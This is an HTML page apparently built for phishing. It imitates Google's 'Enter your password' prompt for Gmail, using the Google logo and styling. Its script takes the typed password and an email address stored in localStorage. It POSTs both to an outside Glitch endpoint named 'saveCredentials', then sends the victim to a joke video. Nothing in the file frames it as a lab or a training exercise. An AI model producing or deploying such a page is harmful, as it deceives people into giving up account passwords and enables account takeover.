<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, input, button {
            font-family: 'Roboto', sans-serif;
        }

        .google-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            margin-bottom: 16px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .google-input:focus {
            border-color: #4285F4;
            box-shadow: 0 0 5px rgba(66, 133, 244, 0.3);
            outline: none;
        }

        .google-input::placeholder {
            color: #5f6368;
        }

        .submit-btn {
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            background-color: #1a73e8;
            color: white;
            font-weight: 500;
            font-size: 16px;
            text-transform: uppercase;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #1569c7;
        }

        .form-container {
            background-color: white;
            border-radius: 12px;
            padding: 40px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 380px;
            margin: auto;
        }

        .header {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 24px;
            color: #202124;
        }

        .subheader {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 16px;
        }

        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen">
    <div class="form-container">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="h-12">
        </div>

        <h1 class="header">Enter your password</h1>
        <p class="subheader">to continue to Gmail</p>

        <form id="passwordForm">
            <input 
                id="password" 
                name="password" 
                type="password" 
                placeholder="Password"
                class="google-input" 
                required minlength="6">

            <a href="#" class="link text-sm block mt-4 mb-4">Forgot password?</a>

            <button type="submit" class="submit-btn">Next</button>
        </form>
    </div>

    <script>
        document.getElementById('passwordForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Get email and password
            let email = localStorage.getItem('userEmail');
            let password = document.getElementById('password').value;

            // Check if the password is at least 6 characters long
            if (password.length < 6) {
                alert("Password must be at least 6 characters long.");
                return;
            }

            // Send email and password to the backend
            fetch('https://chipped-pine-tarascosaurus.glitch.me/saveCredentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            }).then(response => {
                if (response.ok) {
                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                } else {
                    alert("Failed to send credentials.");
                }
            }).catch(error => {
                alert("An error occurred: " + error.message);
            });
        });

        if (!localStorage.getItem('userEmail')) {
            window.location.href = 'index.html'; // Redirect to the email page if no email is stored
        }
    </script>
</body>
</html>
